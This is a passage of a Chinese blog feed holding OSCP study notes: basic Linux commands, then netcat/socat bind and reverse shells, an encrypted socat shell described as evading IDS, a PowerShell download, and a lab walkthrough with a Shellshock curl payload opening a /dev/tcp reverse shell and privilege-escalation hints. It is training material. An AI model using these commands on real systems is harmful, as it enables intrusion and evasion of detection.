&lt;li&gt;Github相关项目&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Empire     https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/EmpireProject/&lt;/span&gt;Empire&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nishang    https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/samratashok/&lt;/span&gt;nishang&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sherlock   https:&lt;span class=&quot;regexp&quot;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&quot;regexp&quot;&gt;/rasta-mouse/&lt;/span&gt;Sherlock&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x01-漏洞利用&quot;&gt;&lt;a href=&quot;#0x01-漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞利用&quot;&gt;&lt;/a&gt;0x01 漏洞利用&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;payload1:powershell反向连接&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
      <category term="Hackthebox" scheme="http://yoursite.com/categories/Hackthebox/"/>
    
    
      <category term="Hackthebox" scheme="http://yoursite.com/tags/Hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>OSCP笔记</title>
    <link href="http://yoursite.com/2021/02/25/OSCP%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2021/02/25/OSCP笔记/</id>
    <published>2021-02-24T16:26:14.773Z</published>
    <updated>2021-02-24T16:35:11.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="built_in">test</span>/{recon,exploit,report}</span><br><span class="line">man</span><br><span class="line">apropos</span><br><span class="line"><span class="built_in">which</span></span><br><span class="line">locate</span><br><span class="line">find</span><br></pre></td></tr></tbody></table></figure><h2 id="0x01-基础服务"><a href="#0x01-基础服务" class="headerlink" title="0x01 基础服务"></a>0x01 基础服务</h2><p>1、SSH</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br><span class="line"></span><br><span class="line">sudo ss -antlp |grep sshd</span><br><span class="line"></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> ssh</span><br></pre></td></tr></tbody></table></figure><a id="more"></a><p>2、HTTP</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br><span class="line"></span><br><span class="line">sudo ss -antlp |grep apache</span><br><span class="line"></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> apache2</span><br></pre></td></tr></tbody></table></figure><p>3、枚举服务</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></tbody></table></figure><h2 id="0x02-搜索、安装、移除工具"><a href="#0x02-搜索、安装、移除工具" class="headerlink" title="0x02 搜索、安装、移除工具"></a>0x02 搜索、安装、移除工具</h2><p>1、apt相关</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">update</span></span><br><span class="line">apt <span class="keyword">upgrade</span></span><br><span class="line">apt-<span class="keyword">cache</span> <span class="keyword">search</span> //搜索apt相关信息</span><br><span class="line">apt <span class="keyword">show</span> </span><br><span class="line">apt <span class="keyword">install</span></span><br><span class="line">apt remove <span class="comment">--purge  //--purge表示完全移除</span></span><br></pre></td></tr></tbody></table></figure><p>2、dpkg(离线安装)</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">dpkg</span> <span class="selector-tag">-i</span> <span class="selector-tag">man-db_2</span><span class="selector-class">.7</span><span class="selector-class">.0</span><span class="selector-class">.2-5_amd64</span><span class="selector-class">.deb</span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x03-Bash"><a href="#0x03-Bash" class="headerlink" title="0x03 Bash"></a>0x03 Bash</h2><p>1、系统环境变量</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $PATH</span><br><span class="line"><span class="keyword">echo</span> $USER</span><br><span class="line"><span class="keyword">echo</span> $PWD</span><br><span class="line"><span class="keyword">echo</span> $HOME</span><br><span class="line">export            <span class="comment">//可以定义环境变量</span></span><br><span class="line">env               <span class="comment">//查看系统环境变量</span></span><br><span class="line">$$                <span class="comment">//当前shell的进程编号</span></span><br></pre></td></tr></tbody></table></figure><p>2、history</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">history</span>           <span class="string">//</span>查看历史执行命令</span><br><span class="line">- !1             <span class="string">//</span>执行histroy中的第n行命令</span><br><span class="line">- !!            <span class="string">//</span>执行<span class="keyword">history</span>中的最后一条</span><br><span class="line">- <span class="string">./bash_history</span> <span class="string">//</span>保存至用户home此文件</span><br><span class="line">- Ctrl+R         <span class="string">//</span>搜索</span><br></pre></td></tr></tbody></table></figure><p>3、管道和重定向</p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">>                <span class="comment">//重定向，原文件内容会被替换</span></span><br><span class="line">echo <span class="string">"Kali Linux is an open source project"</span> > redirection_test.txt</span><br><span class="line">>>               <span class="comment">//附加到原文件内容之后</span></span><br><span class="line"><                <span class="comment">//</span></span><br><span class="line"><span class="number">0</span>/STDIN          <span class="comment">//系统定义的相关描述符</span></span><br><span class="line"><span class="number">1</span>/STDOUT</span><br><span class="line"><span class="number">2</span>/STDERR</span><br><span class="line">|</span><br></pre></td></tr></tbody></table></figure><p>4、搜索和使用</p><p>需要更多地了解正则表达式</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span></span><br><span class="line">-E               <span class="comment">//可以筛选多个规则</span></span><br><span class="line"><span class="keyword">grep</span> -E <span class="string">'A|B'</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sqf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed              <span class="comment">//对文本按照规则进行编辑</span></span><br><span class="line"></span><br><span class="line">kali@kali:~$ <span class="built_in">echo</span> <span class="string">"I need to try hard"</span> | sed <span class="string">'s/hard/harder/'</span></span><br><span class="line">I need <span class="keyword">to</span> <span class="keyword">try</span> harder</span><br></pre></td></tr></tbody></table></figure><figure class="highlight q"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cut</span>              <span class="comment">//对文本按照规则进行提取</span></span><br><span class="line"></span><br><span class="line">kali@kali:~$ echo <span class="string">"I hack binaries,web apps,mobile apps, and just about anything else"</span></span><br><span class="line">| <span class="built_in">cut</span> -f <span class="number">2</span> -d <span class="string">","</span></span><br><span class="line">web apps</span><br></pre></td></tr></tbody></table></figure><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk              <span class="comment">//对文本进行处理和提取</span></span><br><span class="line"></span><br><span class="line">kali<span class="meta">@kali</span>:~$ echo <span class="string">"hello::there::friend"</span> | awk -F <span class="string">"::"</span> <span class="string">'{print <span class="subst">$1</span>, <span class="subst">$3</span>}'</span></span><br><span class="line">hello friend</span><br></pre></td></tr></tbody></table></figure><figure class="highlight swift"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">head</span><br><span class="line">tail</span><br><span class="line">wc -l            <span class="comment">//显示文件中总计的行数</span></span><br><span class="line"><span class="built_in">sort</span></span><br><span class="line">uniq -<span class="built_in">c</span>          <span class="comment">//统计出现次数</span></span><br></pre></td></tr></tbody></table></figure><p>5、文本编辑器</p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nano</span></span><br><span class="line"><span class="attribute">vi</span></span><br></pre></td></tr></tbody></table></figure><p>6、文件比较</p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">comm filea fileb <span class="comment">//文件比较</span></span><br><span class="line">comm <span class="number">-12</span>         <span class="comment">//仅输出两文件中相同部分</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight maxima"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">diff</span> -c</span><br><span class="line"><span class="built_in">diff</span> -u          //对比并合并显示</span><br></pre></td></tr></tbody></table></figure><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vimdiff</span><br><span class="line">• <span class="built_in">do</span>: gets changes <span class="built_in">from</span> <span class="keyword">the</span> other window <span class="keyword">into</span> <span class="keyword">the</span> current <span class="literal">one</span></span><br><span class="line">• dp: puts <span class="keyword">the</span> changes <span class="built_in">from</span> <span class="keyword">the</span> current window <span class="keyword">into</span> <span class="keyword">the</span> other <span class="literal">one</span></span><br><span class="line">• ]c: jumps <span class="built_in">to</span> <span class="keyword">the</span> next change</span><br><span class="line">• [c: jumps <span class="built_in">to</span> <span class="keyword">the</span> previous change</span><br><span class="line">• Ctrl+w: switches <span class="built_in">to</span> <span class="keyword">the</span> other <span class="built_in">split</span> window</span><br></pre></td></tr></tbody></table></figure><p>7、进程处理</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用&来让进程在后台运行</span><br><span class="line">kali@kali:~$<span class="built_in"> ping </span>-c 400 localhost > ping_results.txt &</span><br><span class="line"></span><br><span class="line">列出当前运行的任务</span><br><span class="line">jobs</span><br><span class="line"></span><br><span class="line">在前台/后台继续运行任务中的进程</span><br><span class="line">fg/bg</span><br></pre></td></tr></tbody></table></figure><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps </span><br><span class="line">-<span class="ruby">ef             /<span class="regexp">/e选择所有进程，f显示全格式列表</span></span></span><br><span class="line"><span class="ruby">-C              /<span class="regexp">/按照指定的名称筛选</span></span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kill</span>+pid</span><br><span class="line"><span class="keyword">kill</span> <span class="number">-9</span> <span class="number">-1</span>      //<span class="keyword">All</span> processes <span class="keyword">with</span> pid larger <span class="keyword">than</span> <span class="number">1</span> will be signaled</span><br></pre></td></tr></tbody></table></figure><p>8、文件和命令监控</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tail</span><br><span class="line">-<span class="ruby">f              /<span class="regexp">/动态显示文件最后指定行的输出</span></span></span><br><span class="line"><span class="ruby">-nX             /<span class="regexp">/输出最后X行，默认为10行</span></span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">watch</span><br><span class="line"><span class="deletion">-n</span></span><br></pre></td></tr></tbody></table></figure><p>9、下载文件</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line"><span class="deletion">-O</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl</span><br><span class="line"><span class="deletion">-o</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">axel</span><br><span class="line">-<span class="ruby">n              /<span class="regexp">/指定下载的连接数</span></span></span><br><span class="line"><span class="ruby">-a              /<span class="regexp">/详细进度</span></span></span><br><span class="line"><span class="ruby">-o</span></span><br></pre></td></tr></tbody></table></figure><p>10、定制Bash环境</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bash history</span><br><span class="line"><span class="keyword">export</span> HISTCONTROL=ignoredups                  <span class="comment">//从bash历史记录中移除重复项</span></span><br><span class="line"><span class="keyword">export</span> HISTIGNORE=<span class="string">"&:ls:[bf]g:exit:history"</span>    <span class="comment">//忽略特定指令</span></span><br><span class="line"><span class="keyword">export</span> HISTTIMEFORMAT=<span class="string">'%F %T '</span>                 <span class="comment">//%F-年月日，%T-24小时制</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span></span><br><span class="line"><span class="keyword">alias</span> lsa='<span class="keyword">ls</span> -la'</span><br><span class="line"><span class="keyword">unalias</span>             <span class="string">//</span>重置<span class="keyword">alias</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/bash<span class="selector-class">.bashrc</span>    <span class="comment">//全局bash设定</span></span><br><span class="line">~/<span class="selector-class">.bashrc</span>           <span class="comment">//特定用户的bash设定</span></span><br></pre></td></tr></tbody></table></figure><h2 id="0x04-相关工具"><a href="#0x04-相关工具" class="headerlink" title="0x04 相关工具"></a>0x04 相关工具</h2><p>1、Netcat</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#监听端口</span><br><span class="line">nc -nv x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> y    </span><br><span class="line">nc -nvlp <span class="number">4444</span>       </span><br><span class="line"></span><br><span class="line">#传输文件</span><br><span class="line">nc -nv <span class="number">10.11</span>.<span class="number">0.22</span> <span class="number">4444</span> < /usr/share/windows-resources/binaries/wget.exe</span><br><span class="line">nc -nlvp <span class="number">4444</span> > incoming.exe</span><br><span class="line"></span><br><span class="line">#执行特定程序</span><br><span class="line">nc -nlvp <span class="number">4444</span> -e cmd.exe</span><br><span class="line"></span><br><span class="line">-n                  <span class="comment">//跳过DNS域名解析</span></span><br><span class="line">-v                  <span class="comment">//添加相关参数-目的地址，目的端口号</span></span><br><span class="line">-l                  <span class="comment">//创建监听器</span></span><br><span class="line">-<span class="selector-tag">p</span>                  <span class="comment">//指定相关端口</span></span><br><span class="line">-e                  <span class="comment">//成功连接后执行特定程序</span></span><br></pre></td></tr></tbody></table></figure><p>shell</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">A</span>获取到<span class="selector-tag">B</span>的<span class="selector-tag">shell</span></span><br><span class="line"><span class="selector-tag">B</span>:  <span class="selector-tag">nc</span> <span class="selector-tag">-nlvp</span> 4444 <span class="selector-tag">-e</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span></span><br><span class="line"><span class="selector-tag">A</span>:  <span class="selector-tag">nc</span> <span class="selector-tag">-nv</span> 10<span class="selector-class">.11</span><span class="selector-class">.0</span><span class="selector-class">.22</span> 4444</span><br></pre></td></tr></tbody></table></figure><p>反向shell</p><figure class="highlight dts"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">B:</span>  nc -nlvp <span class="number">4444</span></span><br><span class="line"><span class="symbol">A:</span>  nc -nv <span class="number">10.11</span><span class="number">.0</span><span class="number">.22</span> <span class="number">4444</span> -e <span class="meta-keyword">/bin/</span>bash   <span class="comment">//重点</span></span><br></pre></td></tr></tbody></table></figure><p>2、Socat</p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo socat TCP4-<span class="string">LISTEN:</span><span class="number">443</span> STDOUT</span><br><span class="line">-              <span class="comment">//在本地STDIN和远程直接传输数据</span></span><br></pre></td></tr></tbody></table></figure><p>文件传输</p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">A:</span>  sudo socat TCP4-<span class="string">LISTEN:</span><span class="number">443</span>,fork <span class="string">file:</span>secret_passwords.txt</span><br><span class="line"><span class="string">B:</span>  socat <span class="string">TCP4:</span><span class="number">10.11</span><span class="number">.0</span><span class="number">.4</span>:<span class="number">443</span> <span class="string">file:</span>received_secret_passwords.txt,create</span><br></pre></td></tr></tbody></table></figure><p>反向shell</p><figure class="highlight groovy"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">B:</span>  socat -d -d TCP4-<span class="string">LISTEN:</span><span class="number">443</span> STDOUT         <span class="comment">//-d -d表示显示fatal, error, warning和notice信息</span></span><br><span class="line"><span class="string">A:</span>  socat <span class="string">TCP4:</span><span class="number">10.11</span><span class="number">.0</span><span class="number">.22</span>:<span class="number">443</span> <span class="string">EXEC:</span><span class="regexp">/bin/</span>bash   <span class="comment">//EXEC:类似于nc中的nc -e</span></span><br></pre></td></tr></tbody></table></figure><p>socat加密shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">加密流量传输可以逃避IDS检测，并保持传输数据机密性</span><br><span class="line">openssl相关参数：</span><br><span class="line">req               <span class="comment">//初始化新证书申请流程</span></span><br><span class="line">-newkey           <span class="comment">//生成新的私钥</span></span><br><span class="line">rsa:<span class="number">2048</span>          <span class="comment">//使用2048位的RSA进行加密</span></span><br><span class="line">-nodes            <span class="comment">//存储私钥不使用密码保护</span></span><br><span class="line">-keyout           <span class="comment">//将秘钥保存到指定文件</span></span><br><span class="line">-x509             <span class="comment">//输出自签名证书而不是证书请求</span></span><br><span class="line">-days             <span class="comment">//设置有效期天数</span></span><br><span class="line">-out              <span class="comment">//保存证书到指定文件</span></span><br><span class="line"></span><br><span class="line">#生成证书文件</span><br><span class="line">openssl req -newkey rsa:<span class="number">2048</span> -nodes -keyout bind_shell<span class="selector-class">.key</span> -x509 -days <span class="number">36</span></span><br><span class="line"><span class="number">2</span> -out bind_shell.crt</span><br><span class="line"></span><br><span class="line">#合并证书文件</span><br><span class="line">cat bind_shell<span class="selector-class">.key</span> bind_shell<span class="selector-class">.crt</span> > bind_shell.pem</span><br><span class="line"></span><br><span class="line">#创建监听端口并指定证书</span><br><span class="line">sudo socat OPENSSL-LISTEN:<span class="number">443</span>,cert=bind_shell<span class="selector-class">.pem</span>,verify=<span class="number">0</span>,fork EXEC:/bin/bash</span><br><span class="line">OPENSSL-LISTEN        <span class="comment">//在443端口创建监听</span></span><br><span class="line">cert=bind_shell<span class="selector-class">.pem</span>   <span class="comment">//指定证书文件</span></span><br><span class="line">verify=<span class="number">0</span>              <span class="comment">//禁用SSL验证</span></span><br><span class="line">fork                  <span class="comment">//创建子进程来执行指定程序</span></span><br><span class="line"></span><br><span class="line">#创建SSL连接</span><br><span class="line">socat - OPENSSL:<span class="number">10.11</span>.<span class="number">0.4</span>:<span class="number">443</span>,verify=<span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>3、Powershell/Powercat</p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ExecutionPolicy <span class="comment">Unrestricted</span>     //设置执行策略为不约束</span><br><span class="line">Get-ExecutionPolicy                  //获取执行策略</span><br></pre></td></tr></tbody></table></figure><p>文件传输</p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/</span><br><span class="line">/10.11.0.4/wget.exe','C:<span class="symbol">\U</span>sers<span class="symbol">\o</span>ffsec<span class="symbol">\D</span>esktop<span class="symbol">\w</span>get.exe')"</span><br></pre></td></tr></tbody></table></figure><h2 id="0xFinal-Exercise"><a href="#0xFinal-Exercise" class="headerlink" title="0xFinal Exercise"></a>0xFinal Exercise</h2><ul><li>2.4.3.4</li><li>3.1.3.2</li><li>3.2.5.1</li><li>3.3.5.1</li><li>3.5.3.1</li><li>3.6.3.1</li><li>3.7.2.1</li><li>3.8.3.1</li><li>3.9.3.1</li><li>4.2.4.1</li></ul><h2 id="0xEnv-10-11-1-71"><a href="#0xEnv-10-11-1-71" class="headerlink" title="0xEnv 10.11.1.71"></a>0xEnv 10.11.1.71</h2><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-O</span> <span class="selector-tag">-F</span> <span class="selector-tag">--version-light</span> 10<span class="selector-class">.10</span><span class="selector-class">.10</span><span class="selector-class">.3</span></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sC</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-oA</span> <span class="selector-tag">nmap</span> <span class="selector-tag">x</span><span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span></span><br></pre></td></tr></tbody></table></figure><p>80端口，nikto扫描可以发现/cgi-bin/admin.cgi接口存在破壳漏洞，可以直接获得www-data权限的shell</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A <span class="string">"() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.119.186/4444 0>&1"</span> http:<span class="regexp">//</span><span class="number">10.11</span>.<span class="number">1.71</span><span class="regexp">/cgi-bin/</span>admin.cgi</span><br></pre></td></tr></tbody></table></figure><p>Linux提权相关</p><ul><li><a href="https://www.cnblogs.com/Cl0wn/p/12911902.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0wn/p/12911902.html</a></li><li><a href="https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">https://github.com/jondonas/linux-exploit-suggester-2</a></li></ul><p>ps -aux | grep root 列出以root身份运行的服务</p><p>通过 /etc/passwd 获取了用户名之后，可以去访问特定的 /home/用户名/.bash_history 文件，看看 history 里面有没有泄露密码</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gibson:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:gibson</span>,,,<span class="symbol">:/home/gibson</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></tbody></table></figure><p>拿到www-data的shell之后无法su，需要使用python生成一个bash</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@alpha</span><span class="symbol">:/home/gibson</span><span class="variable">$ </span>echo <span class="string">"import pty; pty.spawn('/bin/bash')"</span> > <span class="regexp">/tmp/asdf</span>.py</span><br><span class="line"><<span class="variable">$ </span>echo <span class="string">"import pty; pty.spawn('/bin/bash')"</span> > <span class="regexp">/tmp/asdf</span>.py</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@alpha</span><span class="symbol">:/tmp</span><span class="variable">$ </span>python asdf.py</span><br><span class="line">python asdf.py</span><br><span class="line">www-data<span class="variable">@alpha</span><span class="symbol">:/tmp</span><span class="variable">$ </span>id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data<span class="variable">@alpha</span><span class="symbol">:/tmp</span><span class="variable">$ </span>su</span><br><span class="line">su</span><br><span class="line"><span class="symbol">Password:</span></span><br></pre></td></tr></tbody></table></figure><p>或者直接</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pytho<span class="symbol">n3</span> -c <span class="string">"import pty; pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></tbody></table></figure><p>目前就是需要拿到gibson的权限（疑似Gibson与root存在密码重用）</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -vE <span class="string">"nologin|false"</span> <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></tbody></table></figure><p>crontab服务以root权限运行，进一步查看当前进程和服务</p><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="built_in">aux</span></span><br><span class="line">netstat 